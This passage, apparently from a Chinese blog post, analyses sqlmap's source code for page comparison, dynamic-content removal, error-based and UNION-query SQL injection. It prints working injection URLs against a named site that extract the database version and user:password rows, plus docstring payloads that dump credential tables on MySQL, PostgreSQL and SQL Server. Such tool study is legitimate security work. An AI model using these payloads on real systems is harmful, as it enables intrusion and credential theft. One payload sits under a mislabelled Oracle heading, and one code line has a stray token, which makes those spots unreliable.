class="hljs-built_in">len</span>(page)<br><br>    <span class="hljs-comment"># 连接发生错误</span><br>    <span class="hljs-keyword">if</span> kb.nullConnection <span class="hljs-keyword">and</span> pageLength:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> seqMatcher.a:<br>            errMsg = <span class="hljs-string">&quot;problem occured while retrieving original page content &quot;</span><br>            errMsg += <span class="hljs-string">&quot;which prevents sqlmap from continuation. please rerun, &quot;</span><br>            errMsg += <span class="hljs-string">&quot;and if problem persists please turn off optimization switches&quot;</span><br>            <span class="hljs-keyword">raise</span> sqlmapNoneDataException, errMsg<br><br>        ratio = <span class="hljs-number">1.</span> * pageLength / <span class="hljs-built_in">len</span>(seqMatcher.a)<br><br>        <span class="hljs-keyword">if</span> ratio &gt; <span class="hljs-number">1.</span>:<br>            ratio = <span class="hljs-number">1.</span> / ratio<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 正常连接情况, 判断是否使用textOnly命令行参数</span><br>        seqMatcher.set_seq1(getFilteredPageContent(seqMatcher.a, <span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> conf.textOnly <span class="hljs-keyword">else</span> seqMatcher.a)<br>        seqMatcher.set_seq2(getFilteredPageContent(page, <span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> conf.textOnly <span class="hljs-keyword">else</span> page)<br>        <span class="hljs-comment"># float 3 digits</span><br>        ratio = <span class="hljs-built_in">round</span>(seqMatcher.quick_ratio(), <span class="hljs-number">3</span>)<br>        logger.debug(<span class="hljs-string">&#x27;ratio: %s&#x27;</span> % ratio)<br><br>    <span class="hljs-comment"># If the url is stable and we did not set yet the match ratio and the</span><br>    <span class="hljs-comment"># current injected value changes the url page content</span><br>    <span class="hljs-keyword">if</span> kb.matchRatio <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> kb.pageStable <span class="hljs-keyword">and</span> ratio &gt;= LOWER_RATIO_BOUND <span class="hljs-keyword">and</span> ratio &lt;= UPPER_RATIO_BOUND:<br>            kb.matchRatio = ratio<br>            logger.debug(<span class="hljs-string">&quot;setting match ratio for current parameter to %.3f&quot;</span> % kb.matchRatio)<br><br>        <span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> kb.pageStable:<br>            <span class="hljs-comment"># CONSTANT_RATIO = 0.900</span><br>            kb.matchRatio = CONSTANT_RATIO<br>            logger.debug(<span class="hljs-string">&quot;setting match ratio for current parameter to default value 0.900&quot;</span>)<br><br>    <span class="hljs-comment"># If it has been requested to return the ratio and not a comparison</span><br>    <span class="hljs-comment"># response</span><br>    <span class="hljs-keyword">if</span> getRatioValue:<br>        <span class="hljs-keyword">return</span> ratio<br>    <br>    <span class="hljs-comment"># ratio &gt; 0.98, 认为两个页面一样</span><br>    <span class="hljs-keyword">elif</span> ratio &gt; UPPER_RATIO_BOUND:  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">elif</span> kb.matchRatio <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># url 不稳定</span><br>        <span class="hljs-keyword">if</span> kb.matchRatio == CONSTANT_RATIO:<br>            <span class="hljs-keyword">return</span> ratio &gt; kb.matchRatio<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># DIFF_TOLERANCE = 0.05  magic number</span><br>            <span class="hljs-keyword">return</span> (ratio - kb.matchRatio) &gt; DIFF_TOLERANCE<br><br><br>移除动态内容<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">removeDynamicContent</span>(<span class="hljs-params">page</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Removing dynamic content from supplied page basing removal on</span><br><span class="hljs-string">    precalculated dynamic markings</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> page:<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> kb.dynamicMarkings:<br>            prefix, suffix = item<br><br>            <span class="hljs-keyword">if</span> prefix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> suffix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">elif</span> prefix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<span class="hljs-literal">None</span><br>                page = getCompiledRegex(<span class="hljs-string">&#x27;(?s)^.+%s&#x27;</span> % suffix).sub(suffix, page)<br>            <span class="hljs-keyword">elif</span> suffix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                page = getCompiledRegex(<span class="hljs-string">&#x27;(?s)%s.+$&#x27;</span> % prefix).sub(prefix, page)<br>            <span class="hljs-keyword">else</span>:<br>                page = getCompiledRegex(<span class="hljs-string">&#x27;(?s)%s.+%s&#x27;</span> % (prefix, suffix)).sub(<span class="hljs-string">&#x27;%s%s&#x27;</span> % (prefix, suffix), page)<br><br>    <span class="hljs-keyword">return</span> page<br><br><span class="hljs-comment"># 查找动态内容</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">findDynamicContent</span>(<span class="hljs-params">firstPage, secondPage</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    This function checks if the provided pages have dynamic content. If they</span><br><span class="hljs-string">    are dynamic, proper markings will be made</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    infoMsg = <span class="hljs-string">&quot;searching for dynamic content&quot;</span><br>    logger.info(infoMsg)<br><br>    <span class="hljs-comment"># 返回匹配的内容</span><br>    blocks = SequenceMatcher(<span class="hljs-literal">None</span>, firstPage, secondPage).get_matching_blocks()<br>    kb.dynamicMarkings = []<br><br>    <span class="hljs-comment"># Removing too small matching blocks</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(blocks):<br>        block = blocks[i]<br>        (_, _, length) = block<br><br><span class="hljs-comment"># DYNAMICITY_MARK_LENGTH = 32</span><br>        <span class="hljs-keyword">if</span> length &lt;= DYNAMICITY_MARK_LENGTH:<br>            blocks.remove(block)<br><br>        <span class="hljs-keyword">else</span>:<br>            i += <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># Making of dynamic markings based on prefix/suffix principle</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(blocks) &gt; <span class="hljs-number">0</span>:<br><br><span class="hljs-comment"># 在blocks的前后添加None</span><br>        blocks.insert(<span class="hljs-number">0</span>, <span class="hljs-literal">None</span>)<br>        blocks.append(<span class="hljs-literal">None</span>)<br><br><span class="hljs-comment"># </span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(blocks) - <span class="hljs-number">1</span>):<br>            prefix = firstPage[blocks[i][<span class="hljs-number">0</span>]:blocks[i][<span class="hljs-number">0</span>] + blocks[i][<span class="hljs-number">2</span>]] <span class="hljs-keyword">if</span> blocks[i] <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>            suffix = firstPage[blocks[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>]:blocks[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>] + blocks[i + <span class="hljs-number">1</span>][<span class="hljs-number">2</span>]] <span class="hljs-keyword">if</span> blocks[i + <span class="hljs-number">1</span>] <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>            <span class="hljs-keyword">if</span> prefix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> blocks[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> suffix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> (blocks[i][<span class="hljs-number">0</span>] + blocks[i][<span class="hljs-number">2</span>] &gt;= <span class="hljs-built_in">len</span>(firstPage)):<br>                <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-comment"># 去掉字符串头和尾的字母和数字</span><br>            prefix = trimAlphaNum(prefix)<br>            suffix = trimAlphaNum(suffix)<br><br>            kb.dynamicMarkings.append((re.escape(prefix[-DYNAMICITY_MARK_LENGTH/<span class="hljs-number">2</span>:]) <span class="hljs-keyword">if</span> prefix <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>, re.escape(suffix[:DYNAMICITY_MARK_LENGTH/<span class="hljs-number">2</span>]) <span class="hljs-keyword">if</span> suffix <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>))<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(kb.dynamicMarkings) &gt; <span class="hljs-number">0</span>:<br>        infoMsg = <span class="hljs-string">&quot;dynamic content marked for removal (%d region%s)&quot;</span> % (<span class="hljs-built_in">len</span>(kb.dynamicMarkings), <span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(kb.dynamicMarkings) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span>)<br>        logger.info(infoMsg)<br></code></pre></td></tr></table></figure><h3 id="grep-正则表达式-，-error-based-SQL-injection-可以检查"><a href="#grep-正则表达式-，-error-based-SQL-injection-可以检查" class="headerlink" title="grep(正则表达式)， error-based SQL injection, 可以检查"></a>grep(正则表达式)， error-based SQL injection, 可以检查</h3><p>MS SQL server， Oracle， Mysql等，使用的语句，使用随机字符串查询，如果返回结果的body，或者头部信息中包含我们构造的随机字符串，则认为存在漏洞.具体数据可以使用sqlmap, payloads.xml，例子:</p><h4 id="MySQL-5-0-AND-error-based-WHERE-or-HAVING-clause"><a href="#MySQL-5-0-AND-error-based-WHERE-or-HAVING-clause" class="headerlink" title="MySQL &gt;&#x3D; 5.0 AND error-based - WHERE or HAVING clause"></a>MySQL &gt;&#x3D; 5.0 AND error-based - WHERE or HAVING clause</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://to.goojje.com/qunba.php?ac=thread_qb&amp;tid=<span class="hljs-number">9136</span>%<span class="hljs-number">20</span>AND%<span class="hljs-number">20</span>(SELECT%<span class="hljs-number">209066</span>%<span class="hljs-number">20</span>FROM(SELECT%<span class="hljs-number">20</span>COUNT(*),CONCAT(CHAR(<span class="hljs-number">58</span>,<span class="hljs-number">106</span>,<span class="hljs-number">108</span>,<span class="hljs-number">98</span>,<span class="hljs-number">58</span>),(MID((IFNULL(CAST(VERSION()%<span class="hljs-number">20</span>AS%<span class="hljs-number">20</span>CHAR),CHAR(<span class="hljs-number">32</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">50</span>)),CHAR(<span class="hljs-number">58</span>,<span class="hljs-number">108</span>,<span class="hljs-number">112</span>,<span class="hljs-number">108</span>,<span class="hljs-number">58</span>),FLOOR(RAND(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x%<span class="hljs-number">20</span>FROM%<span class="hljs-number">20</span>information_schema.tables%<span class="hljs-number">20</span>GROUP%<span class="hljs-number">20</span>BY%<span class="hljs-number">20</span>x)a)<br></code></pre></td></tr></table></figure><p>urldecode 后：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-keyword">to</span>.goojje.com/qunba.php?ac=thread_qb&amp;tid=<span class="hljs-number">9136</span> <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">9066</span> <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> COUNT(*),CONCAT(<span class="hljs-type">CHAR</span>(<span class="hljs-number">58</span>,<span class="hljs-number">106</span>,<span class="hljs-number">108</span>,<span class="hljs-number">98</span>,<span class="hljs-number">58</span>),(MID((IFNULL(CAST(VERSION() <span class="hljs-keyword">AS</span> <span class="hljs-type">CHAR</span>),<span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">50</span>)),<span class="hljs-type">CHAR</span>(<span class="hljs-number">58</span>,<span class="hljs-number">108</span>,<span class="hljs-number">112</span>,<span class="hljs-number">108</span>,<span class="hljs-number">58</span>),FLOOR(RAND(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">FROM</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> x)a)<br></code></pre></td></tr></table></figure><ul><li>CONCAT 字符串连接</li><li>IFNULL 判断是否为空</li><li>CAST 将字符串转化为不同的字符集</li><li>MID  字符串截取 MID(string, position[, length])</li><li>CHAR(58,106,108,98,58)  &#x3D;&gt; :bjl:</li><li>CHAR(58,108,112,108,58) &#x3D;&gt; :lpl:</li></ul><p>利用的Mysql的一个特性，<a href="http://bugs.mysql.com/bug.php?id=32249">http://bugs.mysql.com/bug.php?id=32249</a></p><h4 id="Microsoft-SQL-Server-Sybase-AND-error-based-WHERE-or-HAVING-clause"><a href="#Microsoft-SQL-Server-Sybase-AND-error-based-WHERE-or-HAVING-clause" class="headerlink" title="Microsoft SQL Server&#x2F;Sybase AND error-based - WHERE or HAVING clause"></a>Microsoft SQL Server&#x2F;Sybase AND error-based - WHERE or HAVING clause</h4><p>这部分没有记录。</p><h4 id="PostgreSQL-AND-error-based-WHERE-or-HAVING-clause"><a href="#PostgreSQL-AND-error-based-WHERE-or-HAVING-clause" class="headerlink" title="PostgreSQL AND error-based - WHERE or HAVING clause"></a>PostgreSQL AND error-based - WHERE or HAVING clause</h4><p>这部分没有记录。</p><h4 id="Oracle-AND-error-based-WHERE-or-HAVING-clause-XMLType"><a href="#Oracle-AND-error-based-WHERE-or-HAVING-clause-XMLType" class="headerlink" title="Oracle AND error-based - WHERE or HAVING clause (XMLType)"></a>Oracle AND error-based - WHERE or HAVING clause (XMLType)</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-keyword">to</span>.goojje.com/qunba.php?ac=thread_qb&amp;tid=<span class="hljs-number">9136</span> <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">6531</span> <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> COUNT(*),CONCAT(<span class="hljs-type">CHAR</span>(<span class="hljs-number">58</span>,<span class="hljs-number">121</span>,<span class="hljs-number">121</span>,<span class="hljs-number">98</span>,<span class="hljs-number">58</span>),(<span class="hljs-keyword">SELECT</span> MID(IFNULL(CAST(concat(<span class="hljs-keyword">user</span>,<span class="hljs-type">char</span>(<span class="hljs-number">58</span>),<span class="hljs-keyword">password</span>) <span class="hljs-keyword">AS</span> <span class="hljs-type">CHAR</span>), <span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">50</span>) <span class="hljs-keyword">FROM</span> mysql.<span class="hljs-keyword">user</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-type">CHAR</span>(<span class="hljs-number">58</span>,<span class="hljs-number">106</span>,<span class="hljs-number">116</span>,<span class="hljs-number">113</span>,<span class="hljs-number">58</span>),FLOOR(RAND(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> x)a)<br></code></pre></td></tr></table></figure><h3 id="unionTest-函数，UNION-query-inband-SQL-injection"><a href="#unionTest-函数，UNION-query-inband-SQL-injection" class="headerlink" title="unionTest() 函数，UNION query (inband) SQL injection"></a>unionTest() 函数，UNION query (inband) SQL injection</h3><p>(1) 设置union 使用的字符和注释<br>(2) 判断union查询的列数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forgeInbandQuery</span>(<span class="hljs-params">self, query, position, count, comment, prefix, suffix, char, multipleUnions=<span class="hljs-literal">None</span>, limited=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Take in input an query (pseudo query) string and return its</span><br><span class="hljs-string">    processed UNION ALL SELECT query.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Examples:</span><br><span class="hljs-string"></span><br><span class="hljs-string">    MySQL input:  CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)) FROM mysql.user</span><br><span class="hljs-string">    MySQL output:  UNION ALL SELECT NULL, CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)), NULL FROM mysql.user-- AND 7488=7488</span><br><span class="hljs-string"></span><br><span class="hljs-string">    PostgreSQL input:  (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)) FROM pg_shadow</span><br><span class="hljs-string">    PostgreSQL output:  UNION ALL SELECT NULL, (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)), NULL FROM pg_shadow-- AND 7133=713</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Oracle input:  (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))</span><br><span class="hljs-string">    Oracle output:  UNION ALL SELECT NULL, (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)), NULL FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))-- AND 6738=6738</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Microsoft SQL Server input:  (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)) FROM master..sysxlogins</span><br><span class="hljs-string">    Microsoft SQL Server output:  UNION ALL SELECT NULL, (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)), NULL FROM master..sysxlogins-- AND 3254=3254</span><br><span class="hljs-string"></span><br><span class="hljs-string">    @param query: it is a processed query string unescaped to be</span><br><span class="hljs-string">    forged within an UNION ALL SELECT statement</span><br><span class="hljs-string">    @type query: C&#123;str&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    @param position: it is the NULL position where it is possible</span><br><span class="hljs-string">    to inject the query</span><br><span class="hljs-string">    @type position: C&#123;int&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    @return: UNION ALL SELECT query string forged</span><br><span class="hljs-string">    @rtype: C&#123;str&#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> query.startswith(<span class="hljs-string">&quot;SELECT &quot;</span>):<br>        query = query[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;SELECT &quot;</span>):]<br><br>    inbandQuery = self.prefixQuery(<span class="hljs-string">&quot;UNION ALL SELECT &quot;</span>, prefix=prefix)<br><br>    <span class="hljs-keyword">if</span> limited:<br>        inbandQuery += <span class="hljs-string">&quot;,&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: char <span class="hljs-keyword">if</span> x != position <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;(SELECT %s)&#x27;</span> % query, xrange(<span class="hljs-number">0</span>, count)))<br>        inbandQuery += FROM_TABLE.get(Backend.getIdentifiedDbms(), <span class="hljs-string">&quot;&quot;</span>)<br>        inbandQuery = self.suffixQuery(inbandQuery, comment, suffix)<br><br>        <span class="hljs-keyword">return</span> inbandQuery<br><br>    topNumRegex = re.search(<span class="hljs-string">&quot;\ATOP\s+([\d]+)\s+&quot;</span>, query, re.I)<br>    <span class="hljs-keyword">if</span> topNumRegex:<br>        topNum = topNumRegex.group(<span class="hljs-number">1</span>)<br>        query = query[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;TOP %s &quot;</span> % topNum):]<br>        inbandQuery += <span class="hljs-string">&quot;TOP %s &quot;</span> % topNum<br><br>    intoRegExp = re.search(<span class="hljs-string">&quot;(\s+INTO (DUMP|OUT)FILE\s+\&#x27;(.+?)\&#x27;)&quot;</span>, query, re.I)<br><br>    <span class="hljs-keyword">if</span> intoRegExp:<br>        intoRegExp = intoRegExp.group(<span class="hljs-number">1</span>)<br>        query = query[:query.index(intoRegExp)]<br><br>    <span class="hljs-keyword">if</span> Backend.getIdentifiedDbms() <span class="hljs-keyword">in</span> FROM_TABLE <span class="hljs-keyword">and</span> inbandQuery.endswith(FROM_TABLE[Backend.getIdentifiedDbms()]):<br>        inbandQuery = inbandQuery[:-<span class="hljs-built_in">len</span>(FROM_TABLE[Backend.getIdentifiedDbms()])]<br><br>    <span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, count):<br>        <span class="hljs-keyword">if</span> element &gt; <span class="hljs-number">0</span>:<br>            inbandQuery += <span class="hljs-string">&quot;, &quot;</span><br><br>        <span class="hljs-keyword">if</span> element == position:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot; FROM &quot;</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">or</span> (<span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;WHEN use&quot;</span> <span class="hljs-keyword">in</span> query)) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;EXISTS(&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> query.startswith(<span class="hljs-string">&quot;SELECT &quot;</span>):<br>                conditionIndex = query.index(<span class="hljs-string">&quot; FROM &quot;</span>)<br>                inbandQuery += query[:conditionIndex]<br>            <span class="hljs-keyword">else</span>:<br>                inbandQuery += query<br>        <span class="hljs-keyword">else</span>:<br>            inbandQuery += char<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot; FROM &quot;</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">or</span> (<span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;WHEN use&quot;</span> <span class="hljs-keyword">in</span> query)) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;EXISTS(&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> query.startswith(<span class="hljs-string">&quot;SELECT &quot;</span>):<br>        conditionIndex = query.index(<span class="hljs-string">&quot; FROM &quot;</span>)<br>        inbandQuery += query[conditionIndex:]<br><br>    <span class="hljs-keyword">if</span> Backend.getIdentifiedDbms() <span class="hljs-keyword">in</span> FROM_TABLE:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot; FROM &quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> inbandQuery <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">in</span> inbandQuery <span 